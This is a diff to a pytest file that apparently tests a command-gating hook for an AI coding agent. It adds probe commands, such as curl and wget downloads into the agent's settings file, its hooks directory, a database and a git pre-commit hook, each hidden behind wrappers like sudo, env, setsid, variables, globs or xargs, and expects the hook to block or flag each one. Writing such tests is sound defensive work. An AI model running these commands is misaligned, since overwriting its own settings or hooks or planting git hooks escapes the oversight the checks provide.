@@ -2,6 +2,7 @@
 from __future__ import annotations
 
 import os
+import subprocess
 import sys
 from pathlib import Path
 
@@ -167,7 +168,7 @@ PROBES += [
     ("curl-G-dq-attached", f"curl -G -dq=x {U}", "SIGNED"),
     ("curl-G-sSL-read", f"curl -G -sSL -d q=x {U}", "FREE"),
     ("curl-G-user-read", f"curl -G -d q=x -u user:pass {U}", "FREE"),
-    ("curl-G-o-local-read", f"curl -G -d q=x -o out.json {U}", "FREE"),
+    ("curl-G-o-local-read", f"curl -G -d q=x -o out.json {U}", "SIGNED"),
     ("curl-G-write-out-file", f"curl -G -d q=x -w @fmt.txt {U}", "FREE"),
     ("curl-G-d-o-claude-settings", f"curl -G -d q=x -o {HOME}/.claude/settings.json {U}", "BLOCKED"),
     ("curl-G-o-claude-settings-nodata", f"curl -G -o {HOME}/.claude/settings.json {U}", "BLOCKED"),
@@ -318,6 +319,47 @@ PROBES += [
     ("timeout-curl-o-gaia-db", f"timeout -k 5 10 curl -so {DB} {U}", "BLOCKED"),
     ("nice-wget-O-claude", f"nice -n 5 wget -qO {CS} {U}", "BLOCKED"),
     ("command-curl-o-hooks", f"command curl -o {CH}/x.py {U}", "BLOCKED"),
+    ("var-o-claude", f"O={CS}; curl -o $O {U}", "BLOCKED"),
+    ("var-quoted-o-claude", f'O={CS} && curl -o "$O" {U}', "BLOCKED"),
+    ("var-braced-o-gaia-db", f"D={DB}; curl -o ${{D}} {U}", "BLOCKED"),
+    ("curl-glob-hash-claude", f"curl -o {HOME}/.claude/settings.#1 'https://example.invalid/{{json}}'", "BLOCKED"),
+    ("env-C-relative", f"env -C {HOME}/.claude curl -o settings.json {U}", "BLOCKED"),
+    ("env-i-curl", f"env -i curl -o {CS} {U}", "BLOCKED"),
+    ("sudo-n-curl", f"sudo -n curl -o {CS} {U}", "BLOCKED"),
+    ("sudo-user-long-curl", f"sudo --user root curl -o {CS} {U}", "BLOCKED"),
+    ("command-p-curl", f"command -p curl -o {CS} {U}", "BLOCKED"),
+    ("exec-a-curl", f"exec -a x curl -o {CS} {U}", "BLOCKED"),
+    ("timeout-signal-long-curl", f"timeout --signal KILL 10 curl -o {CS} {U}", "BLOCKED"),
+    ("ionice-curl", f"ionice -c 3 curl -o {CS} {U}", "BLOCKED"),
+    ("setsid-curl", f"setsid curl -o {CS} {U}", "BLOCKED"),
+    ("stdbuf-oL-curl", f"stdbuf -oL curl -o {CS} {U}", "BLOCKED"),
+    ("sudo-curl-G-read", f"sudo curl -G -d q=x {U}", "SIGNED"),
+    ("curl-G-var-in-data", f"curl -G -d q=$Q {U}", "SIGNED"),
+    ("curl-G-url-glob", f"curl -G -d q=x 'https://example.invalid/{{a,b}}'", "SIGNED"),
+]
+
+# The -G read relief needs a line it fully understands; any wrapper, output option,
+# variable or glob keeps the signature the data option had before it.
+G = "curl -G -d q=x"
+LOWERING_ASKS = [
+    ("g-plain-o-claude", f"{G} -o {CS} {U}"),
+    ("g-env-i", f"env -i {G} -o {CS} {U}"),
+    ("g-sudo-n", f"sudo -n {G} -o {CS} {U}"),
+    ("g-sudo-user-long", f"sudo --user root {G} -o {CS} {U}"),
+    ("g-command-p", f"command -p {G} -o {CS} {U}"),
+    ("g-exec-a", f"exec -a x {G} -o {CS} {U}"),
+    ("g-timeout-signal", f"timeout --signal KILL 10 {G} -o {CS} {U}"),
+    ("g-ionice", f"ionice -c 3 {G} -o {CS} {U}"),
+    ("g-setsid", f"setsid {G} -o {CS} {U}"),
+    ("g-var-o", f"O={CS}; {G} -o $O {U}"),
+    ("g-var-gaia-db", f"D={DB}; {G} -o ${{D}} {U}"),
+    ("g-env-C-relative", f"env -C {HOME}/.claude {G} -o settings.json {U}"),
+    ("g-cd-OJ", f"cd {HOME}/.claude && {G} -OJ {U}"),
+    ("g-glob-hash", f"{G} -o {HOME}/.claude/settings.#1 'https://example.invalid/{{json}}'"),
+    ("g-xargs", f"echo {CS} | xargs {G} {U} -o"),
+    ("g-cd-hooks-schemeless-O", f"cd {CH} && {G} -O example.invalid/x.py"),
+    ("g-git-tree", f"{G} -o GITTREE/src.py {U}"),
+    ("g-git-hooks", f"{G} -o GITTREE/.git/hooks/pre-commit {U}"),
 ]
 
 
@@ -360,6 +402,14 @@ def test_probe_ids_are_unique():
 def test_probe(probe_id, command, expected, isolated):
     verdict, reason = _observe(command, isolated)
     assert verdict == expected, f"{verdict} :: {command} :: {reason[:120]}"
+
+
+@pytest.mark.parametrize("probe_id,command", LOWERING_ASKS, ids=[r[0] for r in LOWERING_ASKS])
+def test_lowering_needs_a_fully_understood_line(probe_id, command, isolated, tmp_path):
+    tree = tmp_path / "repo"
+    subprocess.run(["git", "init", "-q", str(tree)], check=True)
+    verdict, reason = _observe(command.replace("GITTREE", str(tree)), isolated)
+    assert verdict in ("BLOCKED", "SIGNED"), f"{verdict} :: {reason[:120]}"
 
 
 @pytest.mark.parametrize("form", ["o", "cd"])
